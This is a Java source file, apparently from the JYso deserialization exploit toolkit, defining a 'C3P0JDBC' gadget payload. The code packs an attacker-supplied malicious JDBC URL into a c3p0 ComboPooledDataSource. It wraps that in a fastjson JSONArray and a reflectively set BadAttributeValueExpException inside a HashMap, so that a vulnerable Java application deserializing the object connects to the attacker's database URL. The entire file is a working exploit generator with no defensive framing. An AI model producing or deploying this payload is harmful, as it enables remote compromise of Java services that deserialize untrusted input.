package com.qi4l.JYso.gadgets;

import com.alibaba.fastjson.JSONArray;
import com.mchange.v2.c3p0.ComboPooledDataSource;
import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;

@SuppressWarnings({"unused"})
@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.alibaba.fastjson:com.alibaba.fastjson1.X"})
@Authors({Authors.UNAM4})
public class C3P0JDBC implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        if (!command.toLowerCase().startsWith("jdbc:")) {
            throw new Exception("Command format is: eviljdbcurl");
        }

        ComboPooledDataSource o = new ComboPooledDataSource();
        o.setJdbcUrl(command);
        o.setMaxIdleTime(1);
        o.setMaxPoolSize(1);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(o);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, jsonArray);

        HashMap<ComboPooledDataSource, BadAttributeValueExpException> hashMap = new HashMap<>();
        hashMap.put(o, val);
        return hashMap;
    }
}
